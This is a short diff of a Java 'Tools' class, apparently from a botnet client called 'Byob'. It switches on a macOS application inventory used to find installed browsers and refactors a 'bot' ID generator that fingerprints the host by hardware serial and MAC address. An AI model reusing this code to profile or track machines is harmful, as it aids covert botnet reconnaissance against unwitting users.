@@ -166,8 +166,8 @@ public class Tools {
         }
         else if(os.contains("mac")){
             
-//            unixTermOut("system_profiler SPApplicationsDataType > mac_profile.txt");
-            browsers = macProfilerTermOut("mac_profile.txt");
+            unixTermOut("system_profiler SPApplicationsDataType > Byob/mac_profile.txt");
+            browsers = macProfilerTermOut("Byob/mac_profile.txt");
             
         }
         else {
@@ -263,22 +263,20 @@ public class Tools {
      *  information and other ones. 
      *  @return Unique ID of the bot
      */
-    public String idGeneration() {
+    public static String idGeneration() {
         String hardware;
         String command = "";
-        switch(getOs().toUpperCase()){
-            case "LINUX":
+        String os = getOs().toLowerCase();
+        if(os.contains("linux")){
                 //command = "lshw | grep -e serial -e product | grep -v Controller | grep -v None";
-                command = "lshw | grep -e serial";
-                break;
-                
-            case "MAC":
-                command = "ifconfig en0 | grep ether";
-                break;
-                
-            case "WINDOWS":
+            command = "lshw | grep -e serial";
+        } else if(os.contains("mac")){
+            command = "ifconfig en0 | grep ether";
+        } else if(os.contains("windows")){
                 command = "getmac";
-                break;
+        } else {
+            System.err.println("Unrecognized Os");
+            return "";
         }
         
         hardware = Tools.runCmd(command);
